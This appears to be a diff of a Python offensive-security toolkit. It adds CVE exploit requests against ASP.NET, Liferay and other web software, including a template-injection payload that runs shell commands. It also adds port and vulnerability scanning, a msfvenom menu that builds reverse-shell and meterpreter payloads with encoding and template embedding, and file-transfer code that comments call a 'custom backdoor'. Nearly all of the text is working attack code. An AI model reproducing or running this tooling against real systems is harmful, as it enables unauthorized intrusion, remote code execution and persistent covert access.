+    data = "__ISEVENT=1&__SOURCE=&__PARAMETERS=ParseControl(\"%3C%25@%20Register%20TagPrefix='x'%20Namespace='System.Runtime.Remoting.Services'%20Assembly='System.Runtime.Remoting,%20Version=4.0.0.0,%20Culture=neutral,%20PublicKeyToken=b77a5c561934e089'%20%25%3E%3Cx:RemotingService%20runat='server'%20Context-Response-ContentType='vulncheck'%20/%3E%0A\")"
+
+    try:
+        response = requests.post(url, headers=headers, verify=False, allow_redirects=False, timeout=2)
+        return response
+    except Timeout:
+        return None
+
+def send_initial_request_cve_2024_32651(domain):
+    collaborator = "google.com"
+    test_command = "echo test"
+    url = f"{domain}/api/email_borrower_agreement/"
+    headers = {
+        "Host": domain.split("//")[-1],  # Extract the host part from the domain
+        "Connection": "close",
+        "Content-Type": "application/json"
+    }
+    payload = {
+        "email": f"\"http://{collaborator}/{{''.__class__.mro()[2].__subclasses__()[185]('{test_command}',shell=True,stdout=-1).communicate()[0].strip()}}\"",
+        "productName": "ga_term"
+    }
+    try:
+        response = requests.post(url, headers=headers, json=payload, verify=False, allow_redirects=False, timeout=2)
+        return response
+    except Timeout:
+        return None
+
+def send_initial_request_decisionsfilewrite(domain):
+    url = f"{domain}/decisions/Primary/API/FileReferenceService/xml/WriteFile"
+    headers = {
+        "Host": domain.split("//")[-1],
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3",
+        "Accept-Encoding": "gzip, deflate",
+        "Dnt": "1",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "iframe",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
+        "Te": "trailers",
+        "Connection": "keep-alive"
+    }
+    try:
+        response = requests.get(url, headers=headers, verify=False, allow_redirects=False, timeout=2)
+        return response
+    except Timeout:
+        return None
+
+def get_key_logi(domain):
+    url = f"{domain}/logi/rdTemplate/rdGetSecureKey.aspx?Username=test"
+    headers = {
+        "Host": domain.split("//")[-1],
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3",
+        "Accept-Encoding": "gzip, deflate",
+        "Dnt": "1",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "iframe",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
+        "Te": "trailers",
+        "Connection": "keep-alive"
+    }
+    try:
+        response = requests.get(url, headers=headers, verify=False, allow_redirects=False, timeout=2)
+        return response
+    except Timeout:
+        return None
+
+def send_initial_request_cve_2020_7961(domain):
+    url = f"{domain}/group/control_panel/..%3b/..%3b/api/jsonws/expandocolumn/add-column/-p_auth/-tableId/-name/-type/-defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource/"
+    headers = {
+        "Host": domain.split("//")[-1],
+        "Connection": "close",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": "4443"
+    }
+    try:
+        response = requests.post(url, headers=headers, verify=False, allow_redirects=False, timeout=2)
+        return response
+    except Timeout:
+        return None
+
+def check_ports_all(domain, hostname):
+    print(" ")
+    print("[+] Checking All Ports, This Will Take 2 Minutes...")
+    print(" ")
+    open_ports = []
+    closed_ports = []
+
+    def check_and_record(port):
+        if check_port(domain.split("//")[-1], port):
+            return (port, True)
+        else:
+            return (port, False)
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+        futures = {executor.submit(check_and_record, port): port for port in range(1, 65536)}
+
+        for future in concurrent.futures.as_completed(futures):
+            try:
+                port, is_open = future.result()
+                if is_open:
+                    open_ports.append(port)
+                else:
+                    closed_ports.append(port)
+            except Exception as e:
+                color = "\033[93m"
+                reset_color = "\033[0m"
+                print(f"{color}[-] An error occurred: {e}{reset_color}")
+
+    # Convert the list of open ports to a comma-separated string
+    open_ports_str = ','.join(map(str, open_ports))
+
+    try:
+        print(" ")
+        print("[+] Initiating Nmap Vulners Scan...")
+        print(" ")
+        command = f"nmap -p {open_ports_str} -sV -T3 --min-rate=750 --script vuln {hostname}"
+        print(f"{command}")
+        subprocess.call(command, shell=True)
+    except KeyboardInterrupt:
+        print("[-] KeyboardInterrupt detected. Moving on..")
+        print(" ")
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occurred: {e}{reset_color}")
+
+    return open_ports_str
+
+def check_port(domain, port):
+    """ Check if a specific port is open on the given domain """
+    try:
+        with socket.create_connection((domain, port), timeout=0.1):
+            return True
+    except (socket.timeout, ConnectionRefusedError, OSError):
+        return False
+
+def check_smb_ports(domain):
+    smb_ports = {
+        20: "FTP Data Transfer",
+        21: "FTP Control",
+        22: "SSH",
+        23: "Telnet",
+        25: "SMTP",
+        53: "DNS",
+        67: "DHCP Server",
+        68: "DHCP Client",
+        69: "TFTP",
+        80: "HTTP",
+        110: "POP3",
+        119: "NNTP",
+        123: "NTP",
+        135: "Microsoft RPC",
+        137: "NetBIOS Name Service",
+        138: "NetBIOS Datagram Service",
+        139: "NetBIOS Session Service",
+        143: "IMAP",
+        161: "SNMP",
+        194: "IRC",
+        389: "LDAP",
+        443: "HTTPS",
+        445: "SMB over TCP",
+        465: "SMTPS",
+        514: "Syslog",
+        520: "RIP",
+        587: "SMTP (submission)",
+        636: "LDAP over SSL",
+        873: "rsync",
+        993: "IMAPS",
+        995: "POP3S",
+        1080: "SOCKS Proxy",
+        1194: "OpenVPN",
+        1433: "Microsoft SQL Server",
+        1521: "Oracle Database",
+        1723: "PPTP",
+        2049: "NFS",
+        2082: "cPanel",
+        2083: "cPanel over SSL",
+        3128: "Squid Proxy",
+        3306: "MySQL Server",
+        3389: "RDP",
+        3690: "Subversion",
+        5432: "PostgreSQL Server",
+        5900: "VNC",
+        5985: "WinRM (HTTP)",
+        5986: "WinRM (HTTPS)",
+        6379: "Redis",
+        6667: "IRC (common alternative)",
+        8080: "HTTP Proxy",
+        8443: "HTTPS (alternative)",
+        9000: "SonarQube",
+        9092: "Kafka",
+        10000: "Webmin",
+        27017: "MongoDB",
+        50000: "SAP",
+    }
+
+    open_ports = []
+    closed_ports = []
+
+    def check_and_record(port, description):
+        if check_port(domain.split("//")[-1], port):
+            return (port, description, True)
+        else:
+            return (port, description, False)
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+        futures = {executor.submit(check_and_record, port, description): port for port, description in smb_ports.items()}
+
+        for future in concurrent.futures.as_completed(futures):
+            try:
+                port, description, is_open = future.result()
+                if is_open:
+                    open_ports.append((port, description))
+                else:
+                    closed_ports.append((port, description))
+            except Exception as e:
+                color = "\033[93m"
+                reset_color = "\033[0m"
+                print(f"{color}[-] An error occurred: {e}{reset_color}")
+
+    return open_ports, closed_ports
+
+def check_cve(domain):
+    cves = [
+        ("CVE-2015-4670", send_initial_request_cve_2015_4670),
+        ("CVE-2021-34427", send_initial_request_cve_2021_34427),
+        ("CVE-2022-21445", send_initial_request_cve_2022_21445),
+        ("CVE-2022-41326", send_initial_request_cve_2022_41326),
+        ("CVE-2023-0100", send_initial_request_cve_2023_0100),
+        ("CVE-2023-35813", send_initial_request_cve_2023_35813),
+        ("CVE-2024-32651", send_initial_request_cve_2024_32651),
+        ("CVE-2020-7961", send_initial_request_cve_2020_7961),
+        ("Decisions File Write", send_initial_request_decisionsfilewrite),
+        ("Logi Open Secure Key", get_key_logi),
+    ]
+
+    for cve_name, request_function in cves:
+        response = request_function(domain)
+        reset_color = "\033[0m"
+        if response is None:
+            print(f"[-] Timeout occured for {domain} with {cve_name}.")
+            continue
+
+        status_code = response.status_code
+
+        if response.status_code == 200:
+            color = "\033[92m"
+            print(f"{color}[+] {domain} appears VULNERABLE to {cve_name} with {response.status_code} response.{reset_color}")
+        elif response.status_code == 500 and cve_name in ["CVE-2022-21445", "CVE-2022-41326", "CVE-2020-7961"]:
+            color = "\033[93m"
+            print(f"{color}[+] {domain} appears VULNERABLE to {cve_name} with {response.status_code} response.{reset_color}")
+        else:
+            print(f"[-] {domain} is NOT vulnerable to {cve_name}: {response.status_code}.")
+
+def check_cve_main(url_input):
+    global globaltarget, globaltargetenabled, limitloop
+
+    while True:
+        while True:
+            if not limitloop:
+                if globaltargetenabled:
+                    if target_is_url:
+                        url = globaltarget
+                        domain = globaltarget
+                        hostname = urllib.parse.urlsplit(domain).hostname
+                        limitloop = True
+                        break
+                    print("")
+                    print("[-] this module requires the target to be a URL")
+                    return
+                if url_input:
+                    url = url_input
+                    if validators.url(url):
+                        domain = url
+                        hostname = urllib.parse.urlsplit(domain).hostname
+                        limitloop = True
+                        break  # Exit the loop if a valid URL is provided
+                    print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
+                    return
+                else:
+                    url = input_with_backspace("\nURL to check (Press enter to exit)> ")
+                if not url:
+                    return  # If the user presses Enter without entering a URL, exit the loop
+                if validators.url(url):
+                    domain = url
+                    hostname = urllib.parse.urlsplit(domain).hostname
+                    break  # Exit the loop if a valid URL is provided
+                print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
+            print("")
+            color = "\033[92m"
+            reset_color = "\033[0m"
+            print(f"{color}[+] completed{reset_color}")
+            limitloop = False
+            return
+
+        cves = [
+            ("CVE-2015-4670", send_initial_request_cve_2015_4670),
+            ("CVE-2021-34427", send_initial_request_cve_2021_34427),
+            ("CVE-2022-21445", send_initial_request_cve_2022_21445),
+            ("CVE-2022-41326", send_initial_request_cve_2022_41326),
+            ("CVE-2023-0100", send_initial_request_cve_2023_0100),
+            ("CVE-2023-35813", send_initial_request_cve_2023_35813),
+            ("CVE-2024-32651", send_initial_request_cve_2024_32651),
+            ("CVE-2020-7961", send_initial_request_cve_2020_7961),
+            ("Decisions File Write", send_initial_request_decisionsfilewrite),
+            ("Logi Open Secure Key", get_key_logi),
+        ]
+
+        for cve_name, request_function in cves:
+            response = request_function(domain)
+            reset_color = "\033[0m"
+            if response is None:
+                print(f"[-] Timeout occured for {domain} with {cve_name}.")
+                continue
+
+            status_code = response.status_code
+
+            if response.status_code == 200:
+                color = "\033[92m"
+                print(f"{color}[+] {domain} appears VULNERABLE to {cve_name} with {response.status_code} response.{reset_color}")
+            elif response.status_code == 500 and cve_name in ["CVE-2022-21445", "CVE-2022-41326", "CVE-2020-7961"]:
+                color = "\033[93m"
+                print(f"{color}[+] {domain} appears VULNERABLE to {cve_name} with {response.status_code} response.{reset_color}")
+            else:
+                print(f"[-] {domain} is NOT vulnerable to {cve_name}: {response.status_code}.")
+
+def checkall(url_input):
+    global globaltarget, globaltargetenabled, limitloop
+
+    while True:
+        while True:
+            if not limitloop:
+                if globaltargetenabled:
+                    if target_is_url:
+                        url = globaltarget
+                        domain = globaltarget
+                        hostname = urllib.parse.urlsplit(domain).hostname
+                        limitloop = True
+                        break
+                    print("")
+                    print("[-] this module requires the target to be a URL")
+                    return
+                if url_input:
+                    url = url_input
+                    if validators.url(url):
+                        domain = url
+                        hostname = urllib.parse.urlsplit(domain).hostname
+                        limitloop = True
+                        break  # Exit the loop if a valid URL is provided
+                    print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
+                    return
+                else:
+                    url = input_with_backspace("\nURL to check (Press enter to exit)> ")
+                if not url:
+                    return  # If the user presses Enter without entering a URL, exit the loop
+                if validators.url(url):
+                    domain = url
+                    hostname = urllib.parse.urlsplit(domain).hostname
+                    break  # Exit the loop if a valid URL is provided
+                print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
+            print("")
+            color = "\033[92m"
+            reset_color = "\033[0m"
+            print(f"{color}[+] completed{reset_color}")
+            limitloop = False
+            return
+
+        try:
+            print(" ")
+            print("[+] Looking for Subdomains...")
+            print(" ")
+            capture_subdomains(domain, sublist3r_output_file)
+        except KeyboardInterrupt:
+            print("[-] KeyboardInterrupt detected. Moving on...")
+            print(" ")
+        except Exception as e:
+            print(f"[-] An error occurred: {e}")
+
+        try:
+            print(" ")
+            print("[+] Crawling...")
+            print(" ")
+            default_spider(domain)
+        except KeyboardInterrupt:
+            print("[-] KeyboardInterrupt detected. Moving on...")
+            print(" ")
+        except Exception as e:
+            print(f"[-] An error occurred: {e}")
+
+        try:
+            print(" ")
+            print("[+] Quickly Checking for Exploits...")
+            print(" ")
+            process_wordlist_check_cve(sublist3r_output_file, domain)
+        except KeyboardInterrupt:
+            print("[-] KeyboardInterrupt detected. Moving on...")
+            print(" ")
+        except Exception as e:
+            print(f"[-] An error occurred: {e}")
+
+        print(" ")
+        print("[+] Checking for potentially vulnerable endpoints...")
+        print(" ")
+        def run_check(description, filename):
+            try:
+                print(f"\n[+] {description}")
+                process_wordlist_check_endpoints(sublist3r_output_file, domain, filename)
+                color = "\033[92m"
+                reset_color = "\033[0m"
+                print(f"{color}[+] completed{reset_color}")
+                print(" ")
+            except KeyboardInterrupt:
+                print("[-] KeyboardInterrupt detected. Moving on...")
+                print(" ")
+            except Exception as e:
+                print(f"[-] An error occurred: {e}")
+
+        # List of descriptions and files to check
+        checks = [
+            ("Checking SQL Endpoints...", sql_endpoints_file),
+            ("Checking LFI Endpoints...", lfi_endpoints_file),
+            ("Checking Deserialization Endpoints...", deserialization_endpoints_file),
+            ("Checking File Upload Endpoints...", upload_endpoints_file),
+            ("Checking Misc Interesting Endpoints...", misc_vuln_endpoints),
+            #("Checking Interesting Endpoints with Known Paths...", endpoints_with_paths),
+        ]
+
+        # Use ThreadPoolExecutor to manage threads
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            futures = [executor.submit(run_check, description, filename) for description, filename in checks]
+        
+            # Wait for all threads to complete
+            for future in futures:
+                future.result()
+
+        try:
+            # Check ports
+            print("[+] Quickly Checking for Common Ports...")
+            print(" ")
+            open_ports, closed_ports = check_smb_ports(domain)
+            color = "\033[92m"
+            reset_color = "\033[0m"
+            if open_ports:
+                for port, description in open_ports:
+                    print(f"{color}[+] Port {port} ({description}) is OPEN{reset_color}")
+        except KeyboardInterrupt:
+            print("[-] KeyboardInterrupt detected. Moving on...")
+            print(" ")
+        except Exception as e:
+            print(f"[-] An error occurred: {e}")
+
+        try:
+            print(" ")
+            check_ports_all(domain, hostname)
+        except KeyboardInterrupt:
+            print("[-] KeyboardInterrupt detected. Moving on..")
+            print(" ")
+        except Exception as e:
+            print(f"[-] An error occurred: {e}")
+
+        try:
+            process_wordlist_nikto(sublist3r_output_file)
+        except KeyboardInterrupt:
+            print("[-] KeyboardInterrupt detected. Moving on...")
+            print(" ")
+        except Exception as e:
+            print(f"[-] An error occurred: {e}")
+
+        try:
+            process_wordlist_ffuf(sublist3r_output_file)
+        except KeyboardInterrupt:
+            print("[-] KeyboardInterrupt detected. Moving on...")
+            print(" ")
+        except Exception as e:
+            print(f"[-] An error occurred: {e}")
 
 def generate_payload():
     global default_lhost, default_lport, default_payload
     
+    # Payload options with default values for extension, format, platform, and architecture
+    payload_options = {
+        "windows/x64/meterpreter/reverse_tcp": {"extension": "exe", "format": "exe", "platform": "windows", "arch": "x64"},
+        "windows/x64/meterpreter_reverse_tcp": {"extension": "exe", "format": "exe", "platform": "windows", "arch": "x64"},
+        "windows/x64/shell/reverse_tcp": {"extension": "exe", "format": "exe", "platform": "windows", "arch": "x64"},
+        "windows/x64/shell_reverse_tcp": {"extension": "exe", "format": "exe", "platform": "windows", "arch": "x64"},
+        "linux/x64/meterpreter/reverse_tcp": {"extension": "elf", "format": "elf", "platform": "linux", "arch": "x64"},
+        "linux/x64/shell_reverse_tcp": {"extension": "elf", "format": "elf", "platform": "linux", "arch": "x64"},
+        "osx/x64/meterpreter/reverse_tcp": {"extension": "macho", "format": "macho", "platform": "osx", "arch": "x64"},
+        "osx/x64/meterpreter_reverse_tcp": {"extension": "macho", "format": "macho", "platform": "osx", "arch": "x64"},
+        "osx/x64/shell_reverse_tcp": {"extension": "macho", "format": "macho", "platform": "osx", "arch": "x64"},
+        "php/meterpreter_reverse_tcp": {"extension": "php", "format": "raw", "platform": "php", "arch": "php"},
+        "php/reverse_php": {"extension": "php", "format": "raw", "platform": "php", "arch": "php"},
+        "java/jsp_shell_reverse_tcp": {"extension": "jsp", "format": "raw", "platform": "java", "arch": "java"},
+        "java/shell_reverse_tcp": {"extension": "jsp", "format": "raw", "platform": "java", "arch": "java"},
+        "android/meterpreter/reverse_tcp": {"extension": "apk", "format": "raw", "platform": "android", "arch": "dalvik"},
+        "cmd/unix/reverse_python": {"extension": "py", "format": "raw", "platform": "unix", "arch": "cmd"},
+        "cmd/unix/reverse_bash": {"extension": "sh", "format": "raw", "platform": "unix", "arch": "cmd"},
+    }
+
     # Display a menu of payloads
-    print()
-    print("Available payloads:")
-    for i, (payload_name, _) in enumerate(payload_extensions.items(), start=1):
+    print("\nAvailable payloads:")
+    for i, payload_name in enumerate(payload_options.keys(), start=1):
         print(f" {i}. {payload_name}")
             
     while True:
-        payload_choice = input(f"\nSelect a payload or press enter to use {default_payload}: ").strip()
+        payload_choice = input(f"\nSelect a payload (Press enter to exit)> ").strip()
         if not payload_choice:
-            payload = default_payload
-            break
-        elif payload_choice.isdigit() and 1 <= int(payload_choice) <= len(payload_extensions):
-            payload = list(payload_extensions.keys())[int(payload_choice) - 1]
+            return
+        elif payload_choice.isdigit() and 1 <= int(payload_choice) <= len(payload_options):
+            payload = list(payload_options.keys())[int(payload_choice) - 1]
             break
         else:
             print("Invalid selection. Please choose a valid number.")
@@ -164,9 +1478,15 @@ def generate_payload():
     # Prompt the user for input, allowing them to press Enter to keep the current value
     lhost = input(f"Enter a new LHOST ({default_lhost}): ").strip() or default_lhost
     lport = input(f"Enter a new LPORT ({default_lport}): ").strip() or default_lport
+    template = input(f"Enter a template file path (optional, leave blank if not used): ").strip()
 
-    # Suggest the default file extension based on the payload
-    default_extension = payload_extensions.get(payload, 'bin')
+    # Get the default options based on the selected payload
+    options = payload_options[payload]
+    default_extension = options["extension"]
+    default_format = options["format"]
+    default_platform = options["platform"]
+    default_arch = options["arch"]
+
     filename = input(f"Enter filename (default extension: .{default_extension}): ").strip()
     if not filename:
         filename = f"payload.{default_extension}"
@@ -174,10 +1494,8 @@ def generate_payload():
         # If the user did not provide an extension, use the default
         filename += f".{default_extension}"
 
-    if filename.endswith((".php", ".jsp", ".apk")):
-        filetype = f"raw"
-    else:
-        filetype = os.path.splitext(filename)[1].lstrip('.'),
+    # Prepend the directory path to the filename
+    full_path = os.path.join(payloads_directory, filename)
 
     # Construct the msfvenom command
     msfvenom_command = [
@@ -185,9 +1503,15 @@ def generate_payload():
         "-p", payload,
         "LHOST={}".format(lhost),
         "LPORT={}".format(lport),
-        "-f", filetype,
-        "-o", filename
+        "-f", default_format,
+        "-o", full_path,
+        "-e", default_encoder,
+        "-i", str(default_iterations),
+        "--platform", default_platform,
+        "-a", default_arch
     ]
+    if template:
+        msfvenom_command.extend(["-x", template])
     
     # Execute the msfvenom command
     print(f"\nGenerating: {' '.join(msfvenom_command)}\n")
@@ -197,7 +1521,9 @@ def generate_payload():
     if result.returncode == 0:
         print(f"[+] Payload generated successfully and saved to {filename}")
     else:
-        print(f"[-] Failed to generate payload. Error: {result.stderr}")
+        print(f"[-] Failed to generate payload. {result.stderr}")
+
+    generate_payload()
 
 def send_metasploit_commands(master):
 
@@ -264,8 +1590,9 @@ def load_metasploit_params():
         default_timeout = config.getint('Metasploit', 'timeout', fallback=default_timeout)
         default_http_user_agent = config.get('Metasploit', 'http_user_agent', fallback=default_http_user_agent)
         default_ssl = config.getboolean('Metasploit', 'ssl', fallback=default_ssl)
-        
-        print(f"[+] metasploit_config.ini loaded")
+        color = "\033[92m"
+        reset_color = "\033[0m"
+        print(f"{color}[+] metasploit_config.ini loaded{reset_color}")
     except configparser.Error as e:
         print(f"Error loading configuration: {e}")
         
@@ -434,7 +1761,9 @@ def route(master):
         os.write(master, f"y\n".encode())
         
     except Exception as e:
-        print(f"[-] An error occured {e}")
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occured {e}{reset_color}")
         
 def find_available_port(start_port=9000, end_port=9999):
     for port in range(start_port, end_port + 1):
@@ -474,11 +1803,11 @@ def is_valid_network(network):
     
     return True
 
-def send_file(filename):
+def send_file(filename): #this is for my custom backdoor so ignore if your not me
     try:
         # Device's IP address
         SERVER_HOST = "0.0.0.0"
-        SERVER_PORT = 8080
+        SERVER_PORT = 3334
         # Receive 4096 bytes each time
         SEPARATOR = "<SEPARATOR>"
         BUFFER_SIZE = 4096
@@ -496,7 +1825,9 @@ def send_file(filename):
 
         # Check if the file exists
         if not os.path.isfile(filename):
-            print("[-] File not found")
+            color = "\033[93m"
+            reset_color = "\033[0m"
+            print("{color}[-] File not found{reset_color}")
             return
 
         # Get the file size
@@ -514,18 +1845,22 @@ def send_file(filename):
                     break
                 # Send the bytes to the server
                 client_socket.sendall(bytes_read)
-        print(f"[+] {filename} sent")
+        color = "\033[92m"
+        reset_color = "\033[0m"
+        print(f"{color}[+] {filename} sent{reset_color}")
         # Close the socket
         client_socket.close()
         # Close the server socket
         s.close()
     except Exception as e:
-        print(f"An error occurred: {str(e)}")
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}An error occurred: {str(e)}{reset_color}")
 
-def receive_file(filename):
+def receive_file(filename): #this is for my custom backdoor so ignore if your not me
     try:
         SERVER_HOST = "0.0.0.0"
-        SERVER_PORT = 8080
+        SERVER_PORT = 3334
         # Receive 4096 bytes each time
         SEPARATOR = "<SEPARATOR>"
         BUFFER_SIZE = 4096
@@ -565,8 +1900,9 @@ def receive_file(filename):
                     break
                 # Write to the file the bytes we just received
                 f.write(bytes_read)
-
-        print(f"[+] {filename} received.")
+        color = "\033[92m"
+        reset_color = "\033[0m"
+        print(f"{color}[+] {filename} received.{reset_color}")
         # Close the client socket
         client_socket.close()
         # Close the server socket
@@ -576,87 +1912,117 @@ def receive_file(filename):
     except ValueError as ve:
         print(f"[-] An error occurred: {ve}")
     except Exception as e:
-        print(f"[-] An error occurred: {e}")
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occurred: {e}{reset_color}")
 
-def fuzz():
+def fuzz(url_input):
+    global globaltarget, globaltargetenabled, limitloop
     print("\n**USE BASH IF YOU WANT TO ENTER WHOLE FFUF COMMANDS**")
-    while True:  # Infinite loop to keep asking for URLs until the user exits
-        try:
-            while True:
-                url = input_with_backspace("\nURL to fuzz (Press enter to exit)> ")
-                if not url:
-                    return  # If the user presses Enter without entering a URL, exit the loop
-                if validators.url(url):
-                    break  # Exit the loop if a valid URL is provided
-                print("[-] Invalid input. Please enter a valid URL (e.g., https://example.com/).")
+    
+    try:
+        while True:
+            if not limitloop:
+                if globaltargetenabled:
+                    if target_is_url:
+                        url = globaltarget
+                        domain = globaltarget
+                        hostname = urllib.parse.urlsplit(domain).hostname
 
-            while True:
-                custom_wordlist = input_with_backspace("Path/name of the wordlist (Press enter for default): ")
-                if custom_wordlist == "":
-                    custom_wordlist = "/usr/share/dirb/wordlists/big.txt" #***Default wordlist value*** set to whatever you want.
+                        command = f"ffuf -u {domain}/FUZZ -w {ffuf_default_wordlist} -c -mc all -fc 404,400  -D -e zip,aspx,vbhtml -recursion -t 50 -sf -ac"
+                        print(f"\n{command}\n")
+                        subprocess.call(command, shell=True)
+                        print(f"\033[92m[+] completed\033[0m")
+                        limitloop = True
+                        return
+                    else:
+                        print("[-] This module requires the target to be a URL")
+                        return
 
-                try:
-                    with open(custom_wordlist):
-                        break  # Exit the loop if the file is found
-                except FileNotFoundError:
-                    print(f"[-] {custom_wordlist} not found. Please try again.")
-
-            while True:
-                try:
-                    threads_input = input_with_backspace("How many threads? -t (Press enter for default): ")
-                    if not threads_input:
-                        threads = "100" # Default value if Enter is pressed
+                if url_input:
+                    url = url_input
+                    if validators.url(url):
+                        domain = url
+                        hostname = urllib.parse.urlsplit(domain).hostname
+                        limitloop = True
                         break
                     else:
-                        threads = int(threads_input)
-                        if threads <= 0:
-                            print("[-] threads must be a positive integer greater than zero.")
-                        else:
-                            break
-                except ValueError:
-                    print("[-] Invalid thread count. Please enter a valid integer greater than zero.")
-
-            while True:
-                try:
-                    filterwords_input = input_with_backspace("Filter by number of words? -fw (Press enter for N/A): ")
-                    if not filterwords_input:
-                        filterwords = "" #Default value if Enter is pressed
+                        print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
+                        return
+                else:
+                    url = input_with_backspace("\nURL to check (Press enter to exit)> ").strip()
+                    if not url:
+                        return
+                    if validators.url(url):
+                        domain = url
+                        hostname = urllib.parse.urlsplit(domain).hostname
                         break
                     else:
-                        # Parse multiple integers from the input using regex
-                        filterwords_list = re.findall(r'\d+', filterwords_input)
-                        filterwords = ",".join(filterwords_list)
-                        if not filterwords:
-                            print("[-] -fw must be a positive integer or comma-separated list of positive integers.")
-                        else:
-                            break
-                except ValueError:
-                    print("[-] Invalid word count. Please enter a valid integer or comma-separated list of positive integers.")
+                        print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
 
-            while True:
-                additional_options = input_with_backspace(f"Options/Parameters (-h for list. Press enter for default): ")
-                if additional_options == "":
-                    additional_options = "-c -mc all -fc 404,400  -D -e zip,aspx,vbhtml -recursion"
+        while True:
+            custom_wordlist = input_with_backspace("Path/name of the wordlist (Press enter for default): ").strip()
+            if not custom_wordlist:
+                custom_wordlist = f"{ffuf_default_wordlist}" # Default wordlist value
+            try:
+                with open(custom_wordlist):
+                    break  # Exit the loop if the file is found
+            except FileNotFoundError:
+                print(f"[-] {custom_wordlist} not found. Please try again.")
+
+        while True:
+            threads_input = input_with_backspace("How many threads? -t (Press enter for default): ").strip()
+            if not threads_input:
+                threads = "50" # Default value if Enter is pressed
+                break
+            try:
+                threads = int(threads_input)
+                if threads <= 0:
+                    print("[-] Threads must be a positive integer greater than zero.")
+                else:
                     break
-                elif additional_options.lower() == "-h":
-                    command = "ffuf"
-                    subprocess.call(command, shell=True)
-                    continue
+            except ValueError:
+                print("[-] Invalid thread count. Please enter a valid integer greater than zero.")
+
+        while True:
+            filterwords_input = input_with_backspace("Filter by number of words? -fw (Press enter for N/A): ").strip()
+            if not filterwords_input:
+                filterwords = "" # Default value if Enter is pressed
+                break
+            else:
+                filterwords_list = re.findall(r'\d+', filterwords_input)
+                filterwords = ",".join(filterwords_list)
+                if not filterwords:
+                    print("[-] -fw must be a positive integer or comma-separated list of positive integers.")
                 else:
                     break
 
-            if not filterwords:
-                command = f"ffuf -u {url}/FUZZ -w {custom_wordlist} {additional_options} -t {threads}"
+        while True:
+            additional_options = input_with_backspace("Options/Parameters (-h for list. Press enter for default): ").strip()
+            if not additional_options:
+                additional_options = "-c -mc all -fc 404,400  -D -e zip,aspx,vbhtml -recursion -sf -ac"
+                break
+            elif additional_options.lower() == "-h":
+                command = "ffuf"
+                subprocess.call(command, shell=True)
+                continue
             else:
-                command = f"ffuf -u {url}/FUZZ -w {custom_wordlist} {additional_options} -t {threads} -fw {filterwords}"
-            print()
-            print(command)
-            print()
-            subprocess.call(command, shell=True)
+                break
 
-        except KeyboardInterrupt:
-            print("\nKeyboard interrupt detected. Exiting...\n")
-            return
+        if not filterwords:
+            command = f"ffuf -u {domain}/FUZZ -w {custom_wordlist} {additional_options} -t {threads}"
+        else:
+            command = f"ffuf -u {domain}/FUZZ -w {custom_wordlist} {additional_options} -t {threads} -fw {filterwords}"
+
+        print(f"\n{command}\n")
+        subprocess.call(command, shell=True)
+        
+    except KeyboardInterrupt:
+        print("\nKeyboard interrupt detected. Exiting...\n")
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occurred: {e}{reset_color}")
 
 def sqli():
     try:
@@ -685,6 +2051,11 @@ def sqli():
 
     except KeyboardInterrupt:
         print("\nKeyboard interrupt detected. Exiting...\n")
+        print("")
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occurred: {e}{reset_color}")
 
 def login():
     try:
@@ -696,7 +2067,7 @@ def login():
             if restore.lower() == "y":
                 command = f"hydra -R"
             elif restore.lower() == "n":
-                endpoint = input_with_backspace("Enter the name of the endpoint or press enter to exit (Ex ftp://10.0.0.1)> ")
+                endpoint = input_with_backspace("Enter the name of the endpoint (Press enter to exit) (Ex ftp://10.0.0.1)> ")
                 if not endpoint:
                     return
                     
@@ -734,166 +2105,212 @@ def login():
                 print(f"[-] Error running command: {e}")
     except KeyboardInterrupt:
         print("\nKeyboard interrupt detected. Exiting...\n")
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occurred: {e}{reset_color}")
         
-def scan():
+def scan(url_input):
+    global globaltarget, globaltargetenabled, target_is_url, target_is_ip
     try:
+        if globaltargetenabled:
+            if target_is_url:
+                ip = globaltarget
+                hostname = urllib.parse.urlsplit(ip).hostname
+                command = f"nmap -p- -T3 --min-rate=750 -sC -sV {hostname}"
+                print(f"\n{command}\n")
+                subprocess.call(command, shell=True)
+                return
+            elif target_is_ip:
+                ip = globaltarget
+                command = f"nmap -p- -T3 --min-rate=750 -sC -sV {ip}"
+                print(f"\n{command}\n")
+                subprocess.call(command, shell=True)
+                return
+
         while True:
-            ip = input_with_backspace("\nIP address or URL to scan (Press enter to exit)> ")
-            if not ip:
-                break
